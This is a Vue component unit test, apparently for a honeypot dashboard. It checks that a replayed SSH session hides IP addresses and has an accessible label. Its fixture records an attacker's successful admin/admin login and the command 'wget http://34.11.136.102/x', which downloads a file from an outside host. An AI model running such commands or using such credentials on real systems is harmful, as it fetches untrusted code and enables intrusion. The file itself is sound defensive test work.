import { mount } from '@vue/test-utils'
import { describe, expect, it } from 'vitest'

import SessionTerminal from '@/components/sessions/SessionTerminal.vue'
import type { SessionDetailResponse } from '@/api/generated/types.gen'

function session(over: Partial<SessionDetailResponse> = {}): SessionDetailResponse {
  return {
    id: 's1',
    src_port: 1,
    dst_ip: '172.23.0.2',
    dst_port: 2222,
    protocol: 'ssh',
    sensor: 'edge-01',
    country: 'United States',
    country_code: 'US',
    started_at: '2026-05-31T13:40:52+00:00',
    ended_at: '2026-05-31T13:41:50+00:00',
    auth_attempts: [
      { id: 1, username: 'admin', password: 'admin', success: true, timestamp: '2026-05-31T13:41:38+00:00' },
    ],
    commands: [
      { id: 10, input: 'wget http://34.11.136.102/x', success: true, timestamp: '2026-05-31T13:41:49+00:00' },
    ],
    downloads: [],
    ...over,
  }
}

describe('SessionTerminal', () => {
  it('shows a chrome title without any IP and renders the transcript', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    const title = w.find('.term-title').text()
    expect(title).toContain('honeypot')
    expect(title).toContain('SSH')
    expect(title).not.toContain('172.23.0.2')
    expect(w.find('.term-body').text()).toContain('admin@honeypot')
  })

  it('blots IPs that appear in command text', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    const body = w.find('.term-body').text()
    expect(body).not.toContain('34.11.136.102')
    expect(body).toContain('‹ip›')
  })

  it('labels the terminal region for assistive tech', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    // A named <section> is an implicit region landmark; assert its accessible name.
    expect(w.find('section.terminal').attributes('aria-label')).toContain('Terminal replay')
  })
})
